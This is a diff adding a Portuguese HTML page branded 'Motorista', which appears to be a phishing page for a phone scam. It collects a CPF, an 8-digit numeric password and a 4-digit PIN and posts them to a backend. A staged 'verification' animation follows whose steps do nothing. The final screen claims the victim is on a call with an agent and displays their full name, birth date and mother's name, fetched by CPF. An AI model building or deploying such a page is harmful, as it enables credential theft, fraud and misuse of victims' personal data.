@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Motorista - Sistema de Serviço</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0a0a0a;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ── SCREEN ROUTER ── */
+    .screen { display: none; width: 100%; max-width: 500px; padding: 16px; }
+    .screen.active { display: flex; flex-direction: column; align-items: center; }
+
+    /* ── LOGO ── */
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+    .logo-icon {
+      width: 48px; height: 48px;
+      background: linear-gradient(135deg, #3a5af7 0%, #c93fa5 100%);
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px;
+    }
+    .logo-text { line-height: 1.2; }
+    .logo-text h1 { font-size: 20px; font-weight: 800; letter-spacing: 1px; }
+    .logo-text span { font-size: 10px; color: #3a5af7; letter-spacing: 2px; text-transform: uppercase; }
+
+    /* ── AUTH CARD ── */
+    .card {
+      background: #1a1a1a;
+      border-radius: 16px;
+      padding: 28px;
+      width: 100%;
+    }
+
+    .tab-switch {
+      display: flex;
+      background: #252525;
+      border-radius: 10px;
+      padding: 4px;
+      margin-bottom: 24px;
+    }
+    .tab-switch button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: transparent;
+      color: #888;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all .2s;
+    }
+    .tab-switch button.active {
+      background: #3a5af7;
+      color: #fff;
+    }
+
+    .form-group { margin-bottom: 18px; }
+    .form-group label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #aaa;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+    .input-wrap {
+      position: relative;
+    }
+    .input-wrap .icon {
+      position: absolute;
+      left: 14px; top: 50%;
+      transform: translateY(-50%);
+      color: #555;
+      font-size: 16px;
+    }
+    .input-wrap input {
+      width: 100%;
+      background: #252525;
+      border: 1px solid #333;
+      border-radius: 10px;
+      padding: 14px 14px 14px 40px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .input-wrap input:focus { border-color: #3a5af7; }
+    .input-wrap input::placeholder { color: #555; }
+
+    /* PIN input without icon */
+    .input-plain {
+      width: 100%;
+      background: #252525;
+      border: 1px solid #333;
+      border-radius: 10px;
+      padding: 14px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      text-align: center;
+      letter-spacing: 6px;
+      font-size: 20px;
+      transition: border-color .2s;
+    }
+    .input-plain:focus { border-color: #3a5af7; }
+    .input-plain::placeholder { color: #555; letter-spacing: 2px; font-size: 14px; }
+
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: #3a5af7;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .2s, transform .1s;
+      margin-top: 4px;
+    }
+    .btn-primary:hover { background: #2a47e0; }
+    .btn-primary:active { transform: scale(.98); }
+
+    .footer-text {
+      margin-top: 28px;
+      font-size: 11px;
+      color: #444;
+      text-align: center;
+    }
+
+    /* ── LOADING SCREEN ── */
+    #screen-loading {
+      min-height: 100vh;
+      justify-content: center;
+    }
+    .progress-ring-wrap {
+      position: relative;
+      width: 160px; height: 160px;
+      margin-bottom: 40px;
+    }
+    .progress-ring-wrap svg {
+      transform: rotate(-90deg);
+    }
+    .progress-ring-bg { fill: none; stroke: #1e1e1e; stroke-width: 10; }
+    .progress-ring-bar {
+      fill: none;
+      stroke: #3a5af7;
+      stroke-width: 10;
+      stroke-linecap: round;
+      stroke-dasharray: 440;
+      stroke-dashoffset: 440;
+      transition: stroke-dashoffset .4s ease;
+    }
+    .progress-center {
+      position: absolute;
+      inset: 0;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .progress-pct { font-size: 32px; font-weight: 800; }
+    .progress-time { font-size: 12px; color: #666; margin-top: 2px; }
+
+    .load-title { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+    .load-sub { font-size: 13px; color: #666; margin-bottom: 32px; }
+    .load-icon { font-size: 36px; margin-bottom: 12px; }
+
+    .steps-card {
+      background: #1a1a1a;
+      border-radius: 14px;
+      padding: 20px;
+      width: 100%;
+      max-width: 320px;
+    }
+    .step-row {
+      display: flex; align-items: center; gap: 12px;
+      padding: 8px 0;
+    }
+    .step-row + .step-row { border-top: 1px solid #222; }
+    .step-num {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      background: #252525;
+      border: 1.5px solid #333;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700; color: #555;
+      flex-shrink: 0;
+    }
+    .step-num.done { background: #3a5af7; border-color: #3a5af7; color: #fff; }
+    .step-num.active { background: #3a5af7; border-color: #3a5af7; color: #fff; }
+    .step-label { font-size: 13px; color: #777; }
+    .step-label.active { color: #fff; font-weight: 600; }
+    .step-dots { margin-left: auto; display: flex; gap: 3px; }
+    .step-dots span {
+      width: 5px; height: 5px; border-radius: 50%; background: #3a5af7;
+      animation: bounce .8s infinite alternate;
+    }
+    .step-dots span:nth-child(2) { animation-delay: .2s; }
+    .step-dots span:nth-child(3) { animation-delay: .4s; }
+    @keyframes bounce { from { opacity: .3; transform: scale(.7); } to { opacity: 1; transform: scale(1); } }
+
+    /* ── CHAT SCREEN ── */
+    #screen-chat {
+      min-height: 100vh;
+      padding: 0;
+      max-width: 100%;
+      background: #0d0d0d;
+    }
+
+    .chat-header {
+      display: flex; align-items: center; gap: 12px;
+      padding: 14px 20px;
+      background: #141414;
+      border-bottom: 1px solid #222;
+      width: 100%;
+    }
+    .avatar {
+      width: 40px; height: 40px; border-radius: 50%;
+      background: linear-gradient(135deg, #3a5af7 0%, #c93fa5 100%);
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 800; font-size: 16px;
+    }
+    .chat-header-info h2 { font-size: 15px; font-weight: 700; }
+    .online-dot {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 12px; color: #4caf50;
+    }
+    .online-dot::before {
+      content: '';
+      width: 7px; height: 7px; border-radius: 50%; background: #4caf50;
+    }
+    .header-logo { margin-left: auto; }
+    .header-logo .logo-icon { width: 32px; height: 32px; font-size: 14px; }
+
+    .alert-banner {
+      background: #2a2200;
+      border-left: 3px solid #f5a623;
+      padding: 14px 20px;
+      width: 100%;
+    }
+    .alert-banner h3 {
+      font-size: 13px; font-weight: 800; color: #f5a623;
+      display: flex; align-items: center; gap: 6px;
+      margin-bottom: 4px;
+    }
+    .alert-banner p { font-size: 12px; color: #aaa; }
+    .alert-status { font-size: 11px; color: #f5a623; margin-top: 6px; font-style: italic; }
+
+    .chat-body {
+      padding: 20px;
+      width: 100%;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .chat-bubble-wrap {
+      display: flex; gap: 10px; align-items: flex-start;
+      max-width: 360px;
+    }
+    .chat-bubble {
+      background: #1e1e1e;
+      border-radius: 0 14px 14px 14px;
+      padding: 12px 14px;
+      font-size: 13px; line-height: 1.5; color: #ddd;
+    }
+    .chat-bubble .emoji { margin-left: 4px; }
+
+    .data-card {
+      background: #1a1a1a;
+      border-radius: 14px;
+      padding: 20px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .data-card h3 { font-size: 14px; font-weight: 700; margin-bottom: 16px; }
+    .data-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+    .data-field label { font-size: 11px; color: #555; display: block; margin-bottom: 4px; }
+    .data-field span { font-size: 13px; font-weight: 700; }
+  </style>
+</head>
+<body>
+
+<!-- ══ SCREEN 1: Auth ══ -->
+<div class="screen active" id="screen-auth">
+  <div class="logo-wrap">
+    <div class="logo-icon">🚗</div>
+    <div class="logo-text">
+      <h1>MOTORISTA</h1>
+      <span>Sistema de Serviço</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="tab-switch">
+      <button id="tab-entrar" onclick="switchTab('entrar')">Entrar</button>
+      <button id="tab-cadastrar" class="active" onclick="switchTab('cadastrar')">Cadastrar</button>
+    </div>
+
+    <!-- Login form -->
+    <form id="form-entrar" style="display:none" onsubmit="handleLogin(event)">
+      <div class="form-group">
+        <label>CPF</label>
+        <div class="input-wrap">
+          <span class="icon">👤</span>
+          <input type="text" id="login-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)" />
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Senha</label>
+        <div class="input-wrap">
+          <span class="icon">🔒</span>
+          <input type="password" id="login-senha" placeholder="8 números" maxlength="8" />
+        </div>
+      </div>
+      <button type="submit" class="btn-primary">Entrar</button>
+    </form>
+
+    <!-- Cadastro form -->
+    <form id="form-cadastrar" onsubmit="handleCadastro(event)">
+      <div class="form-group">
+        <label>CPF</label>
+        <div class="input-wrap">
+          <span class="icon">👤</span>
+          <input type="text" id="cad-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)" required />
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Senha</label>
+        <div class="input-wrap">
+          <span class="icon">🔒</span>
+          <input type="password" id="cad-senha" placeholder="8 números" maxlength="8" required />
+        </div>
+      </div>
+      <div class="form-group">
+        <label>PIN (4 Dígitos)</label>
+        <input class="input-plain" type="password" id="cad-pin" placeholder="0000" maxlength="4" inputmode="numeric" required />
+      </div>
+      <button type="submit" class="btn-primary">Criar Conta</button>
+    </form>
+  </div>
+
+  <p class="footer-text">© 2026 Motorista. Todos os direitos reservados.</p>
+</div>
+
+<!-- ══ SCREEN 2: Loading / Verification ══ -->
+<div class="screen" id="screen-loading">
+  <div class="logo-wrap">
+    <div class="logo-icon">🚗</div>
+    <div class="logo-text">
+      <h1>MOTORISTA</h1>
+    </div>
+  </div>
+
+  <div class="progress-ring-wrap">
+    <svg viewBox="0 0 160 160" width="160" height="160">
+      <circle class="progress-ring-bg" cx="80" cy="80" r="70" />
+      <circle class="progress-ring-bar" id="ring-bar" cx="80" cy="80" r="70" />
+    </svg>
+    <div class="progress-center">
+      <span class="progress-pct" id="pct-text">0%</span>
+      <span class="progress-time" id="time-text">30s restantes</span>
+    </div>
+  </div>
+
+  <div class="load-icon" id="load-icon">🔐</div>
+  <div class="load-title" id="load-title">Verificando identidade</div>
+  <div class="load-sub">Aguarde, não feche a tela</div>
+
+  <div class="steps-card">
+    <div class="step-row" id="step-1-row">
+      <div class="step-num active" id="step-1-num">✓</div>
+      <span class="step-label active" id="step-1-lbl">Verificando identidade</span>
+      <div class="step-dots" id="step-1-dots"><span></span><span></span><span></span></div>
+    </div>
+    <div class="step-row">
+      <div class="step-num" id="step-2-num">2</div>
+      <span class="step-label" id="step-2-lbl">Autenticando seus dados</span>
+    </div>
+    <div class="step-row">
+      <div class="step-num" id="step-3-num">3</div>
+      <span class="step-label" id="step-3-lbl">Configurando serviço</span>
+    </div>
+    <div class="step-row">
+      <div class="step-num" id="step-4-num">4</div>
+      <span class="step-label" id="step-4-lbl">Gerando seu cadastro</span>
+    </div>
+    <div class="step-row">
+      <div class="step-num" id="step-5-num">5</div>
+      <span class="step-label" id="step-5-lbl">Ativando serviço</span>
+    </div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 3: Chat / Atendente ══ -->
+<div class="screen" id="screen-chat" style="max-width:100%; min-height:100vh; align-items:stretch;">
+  <div class="chat-header">
+    <div class="avatar">A</div>
+    <div class="chat-header-info">
+      <h2>Atendente</h2>
+      <div class="online-dot">Online agora</div>
+    </div>
+    <div class="header-logo">
+      <div class="logo-icon" style="width:32px;height:32px;font-size:14px;">🚗</div>
+    </div>
+  </div>
+
+  <div class="alert-banner">
+    <h3>⚠️ ESTÁ EM ANÁLISE — AGUARDE</h3>
+    <p>Vimos que está em ligação com um de nossos atendentes.</p>
+    <div class="alert-status">Em análise</div>
+  </div>
+
+  <div class="chat-body">
+    <div class="chat-bubble-wrap">
+      <div class="avatar" style="width:34px;height:34px;font-size:13px;flex-shrink:0;">A</div>
+      <div class="chat-bubble">
+        Vimos que está em ligação com um de nossos atendentes. Aguarde a sincronização. <span class="emoji">🔁</span>
+      </div>
+    </div>
+
+    <div class="data-card">
+      <h3>Dados encontrados</h3>
+      <div class="data-grid">
+        <div class="data-field">
+          <label>Nome completo</label>
+          <span id="dado-nome">—</span>
+        </div>
+        <div class="data-field">
+          <label>Data de nascimento</label>
+          <span id="dado-nasc">—</span>
+        </div>
+        <div class="data-field">
+          <label>Nome da mãe</label>
+          <span id="dado-mae">—</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ── helpers ── */
+  function show(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  function maskCPF(input) {
+    let v = input.value.replace(/\D/g, '').slice(0, 11);
+    if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+    else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+    else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+    input.value = v;
+  }
+
+  function switchTab(tab) {
+    document.getElementById('tab-entrar').classList.toggle('active', tab === 'entrar');
+    document.getElementById('tab-cadastrar').classList.toggle('active', tab === 'cadastrar');
+    document.getElementById('form-entrar').style.display = tab === 'entrar' ? 'block' : 'none';
+    document.getElementById('form-cadastrar').style.display = tab === 'cadastrar' ? 'block' : 'none';
+  }
+
+  /* ── mini banco local (localStorage) ── */
+  function getUsuarios() {
+    try { return JSON.parse(localStorage.getItem('moto_usuarios') || '[]'); } catch { return []; }
+  }
+  function saveUsuarios(list) {
+    try { localStorage.setItem('moto_usuarios', JSON.stringify(list)); } catch {}
+  }
+  function getAcessos() {
+    try { return JSON.parse(localStorage.getItem('moto_acessos') || '[]'); } catch { return []; }
+  }
+  function logAcesso(cpf, tipo) {
+    const list = getAcessos();
+    list.unshift({ cpf, tipo, feito_em: new Date().toLocaleString('pt-BR') });
+    try { localStorage.setItem('moto_acessos', JSON.stringify(list.slice(0, 200))); } catch {}
+  }
+
+  /* hash simples para demo (sem bcrypt no browser) */
+  async function hashStr(str) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+  }
+
+  function showError(msg) {
+    let el = document.getElementById('api-error');
+    if (!el) {
+      el = document.createElement('p');
+      el.id = 'api-error';
+      el.style.cssText = 'color:#f55;font-size:13px;text-align:center;margin-top:12px;';
+    }
+    el.textContent = msg;
+    document.querySelector('.card').appendChild(el);
+  }
+  function clearError() {
+    const el = document.getElementById('api-error');
+    if (el) el.remove();
+  }
+
+  /* tenta API real; cai para localStorage se servidor ausente */
+  async function apiPost(path, body) {
+    try {
+      const r = await fetch(path, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+        signal: AbortSignal.timeout(3000)
+      });
+      return { ok: r.ok, data: await r.json(), remote: true };
+    } catch {
+      return { ok: null, remote: false }; // servidor offline
+    }
+  }
+
+  /* ── auth handlers ── */
+  async function handleLogin(e) {
+    e.preventDefault();
+    clearError();
+    const cpf   = document.getElementById('login-cpf').value;
+    const senha = document.getElementById('login-senha').value;
+
+    if (!cpf || !senha) return showError('Preencha todos os campos.');
+
+    startVerification(async () => {
+      const res = await apiPost('/api/login', { cpf, senha });
+      if (res.remote) {
+        if (!res.ok) { showVerificationError(res.data.erro || 'Erro ao entrar.'); return false; }
+      } else {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        const usuarios = getUsuarios();
+        const senhaHash = await hashStr(senha);
+        const u = usuarios.find(u => u.cpf === cpfLimpo && u.senha === senhaHash);
+        if (!u) { showVerificationError('CPF ou senha incorretos.'); return false; }
+        logAcesso(cpfLimpo, 'login');
+      }
+      return true;
+    });
+  }
+
+  async function handleCadastro(e) {
+    e.preventDefault();
+    clearError();
+    const cpf   = document.getElementById('cad-cpf').value;
+    const senha = document.getElementById('cad-senha').value;
+    const pin   = document.getElementById('cad-pin').value;
+
+    // validação local antes de começar
+    const cpfLimpo = cpf.replace(/\D/g, '');
+    if (cpfLimpo.length !== 11)      return showError('CPF inválido.');
+    if (!/^\d{8}$/.test(senha))      return showError('Senha deve ter exatamente 8 dígitos numéricos.');
+    if (!/^\d{4}$/.test(pin))        return showError('PIN deve ter exatamente 4 dígitos numéricos.');
+
+    // inicia animação e salva no banco durante o passo 4
+    startVerification(async () => {
+      const res = await apiPost('/api/cadastro', { cpf, senha, pin });
+      if (res.remote) {
+        if (!res.ok) { showVerificationError(res.data.erro || 'Erro ao cadastrar.'); return false; }
+      } else {
+        const usuarios = getUsuarios();
+        if (usuarios.find(u => u.cpf === cpfLimpo)) { showVerificationError('CPF já cadastrado.'); return false; }
+        const senhaHash = await hashStr(senha);
+        const pinHash   = await hashStr(pin);
+        usuarios.push({ id: Date.now(), cpf: cpfLimpo, senha: senhaHash, pin: pinHash, criado_em: new Date().toLocaleString('pt-BR') });
+        saveUsuarios(usuarios);
+        logAcesso(cpfLimpo, 'cadastro');
+      }
+      return true;
+    });
+  }
+
+  /* ── loading animation ── */
+  const STEPS = [
+    { icon: '🔐', title: 'Verificando identidade' },
+    { icon: '📋', title: 'Autenticando seus dados' },
+    { icon: '⚙️', title: 'Configurando serviço' },
+    { icon: '📝', title: 'Gerando seu cadastro' },
+    { icon: '✅', title: 'Ativando serviço' },
+  ];
+
+  function showVerificationError(msg) {
+    document.getElementById('load-icon').textContent = '❌';
+    document.getElementById('load-title').textContent = msg;
+    document.getElementById('load-sub').textContent = 'Volte e tente novamente.';
+    const btn = document.createElement('button');
+    btn.className = 'btn-primary';
+    btn.style.marginTop = '20px';
+    btn.textContent = 'Voltar';
+    btn.onclick = () => show('screen-auth');
+    document.getElementById('screen-loading').appendChild(btn);
+  }
+
+  function startVerification(onStep4 = null) {
+    show('screen-loading');
+    // reset botão de erro caso exista
+    const old = document.querySelector('#screen-loading .btn-primary');
+    if (old) old.remove();
+
+    const circumference = 2 * Math.PI * 70;
+    const bar = document.getElementById('ring-bar');
+    bar.style.strokeDasharray = circumference;
+    bar.style.strokeDashoffset = circumference;
+
+    let pct = 0;
+    let stepIdx = 0;
+    let step4done = false;
+    const total = 30;
+
+    function setStep(idx) {
+      for (let i = 1; i <= 5; i++) {
+        const num = document.getElementById(`step-${i}-num`);
+        const lbl = document.getElementById(`step-${i}-lbl`);
+        const dots = document.getElementById(`step-${i}-dots`);
+        if (i - 1 < idx) {
+          num.classList.add('done'); num.textContent = '✓';
+          lbl.classList.remove('active'); lbl.style.color = '#555';
+          if (dots) dots.remove();
+        } else if (i - 1 === idx) {
+          num.classList.add('active'); num.textContent = '✓';
+          lbl.classList.add('active');
+        }
+      }
+      document.getElementById('load-icon').textContent = STEPS[idx].icon;
+      document.getElementById('load-title').textContent = STEPS[idx].title;
+    }
+
+    setStep(0);
+
+    const interval = setInterval(async () => {
+      pct = Math.min(pct + (100 / (total * 10)), 100);
+      const offset = circumference - (pct / 100) * circumference;
+      bar.style.strokeDashoffset = offset;
+      document.getElementById('pct-text').textContent = Math.round(pct) + '%';
+      const remaining = Math.max(0, Math.round(total - (pct / 100) * total));
+      document.getElementById('time-text').textContent = remaining + 's restantes';
+
+      const newStep = Math.min(Math.floor(pct / 20), 4);
+      if (newStep !== stepIdx) { stepIdx = newStep; setStep(stepIdx); }
+
+      // passo 4 (80%) → salva no banco
+      if (stepIdx === 3 && !step4done && onStep4) {
+        step4done = true;
+        clearInterval(interval);
+        const ok = await onStep4();
+        if (!ok) return; // erro já mostrado
+        // continua para 100%
+        const finish = setInterval(() => {
+          pct = Math.min(pct + (100 / (total * 10)), 100);
+          bar.style.strokeDashoffset = circumference - (pct / 100) * circumference;
+          document.getElementById('pct-text').textContent = Math.round(pct) + '%';
+          document.getElementById('time-text').textContent = '0s restantes';
+          setStep(Math.min(Math.floor(pct / 20), 4));
+          if (pct >= 100) { clearInterval(finish); setTimeout(showChat, 600); }
+        }, 80);
+        return;
+      }
+
+      if (pct >= 100) {
+        clearInterval(interval);
+        setTimeout(showChat, 600);
+      }
+    }, 100);
+  }
+
+  /* ── chat screen ── */
+  async function showChat() {
+    show('screen-chat');
+
+    // pega o CPF que foi usado no formulário ativo
+    const tabAtiva = document.getElementById('tab-cadastrar').classList.contains('active') ? 'cadastrar' : 'entrar';
+    const cpf = tabAtiva === 'cadastrar'
+      ? document.getElementById('cad-cpf').value
+      : document.getElementById('login-cpf').value;
+
+    if (!cpf) return;
+
+    document.getElementById('dado-nome').textContent = '...';
+    document.getElementById('dado-nasc').textContent = '...';
+    document.getElementById('dado-mae').textContent  = '...';
+
+    try {
+      const r = await fetch(`/api/consulta?cpf=${cpf.replace(/\D/g, '')}`);
+      const data = await r.json();
+
+      if (data.ok) {
+        document.getElementById('dado-nome').textContent = data.nome        || '—';
+        document.getElementById('dado-nasc').textContent = data.nascimento  || '—';
+        document.getElementById('dado-mae').textContent  = data.mae         || '—';
+      } else {
+        document.getElementById('dado-nome').textContent = data.erro || 'Não encontrado';
+        document.getElementById('dado-nasc').textContent = data.detalhe ? data.detalhe.slice(0,40) : '—';
+        document.getElementById('dado-mae').textContent  = '—';
+      }
+    } catch (err) {
+      document.getElementById('dado-nome').textContent = 'Erro: ' + (err.message || 'desconhecido');
+      document.getElementById('dado-nasc').textContent = '—';
+      document.getElementById('dado-mae').textContent  = '—';
+    }
+  }
+</script>
+</body>
+</html>
